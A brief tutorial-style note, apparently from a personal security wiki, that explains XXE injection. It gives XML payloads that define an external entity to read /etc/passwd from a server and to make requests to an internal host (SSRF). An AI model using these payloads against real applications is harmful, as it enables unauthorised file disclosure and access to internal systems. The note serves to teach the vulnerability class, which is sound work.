XXE (external XML entity) injection is a vulnerability where an attacker can interfere with the application's processing of XML.

It is done by defining an entity and calling it in a field that is returned by the server:

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM <something> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
	</stockCheck>
```

For example, to retrieve a file:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Or to perform an [[SSRF]]:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
